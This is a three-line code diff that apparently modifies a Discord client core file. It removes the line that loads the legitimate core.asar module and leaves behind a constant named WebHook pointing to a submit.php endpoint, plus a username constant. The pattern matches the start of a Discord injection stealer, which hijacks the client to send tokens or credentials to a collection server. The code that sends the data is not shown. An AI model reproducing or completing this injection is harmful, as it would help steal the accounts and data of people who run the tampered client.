@@ -1,6 +1,3 @@
-'use strict';
-module.exports = require('./core.asar');
-
 const WebHook = 'https://192.168.1.9/server/submit.php';
 
 const Usrname = 'Disjack';
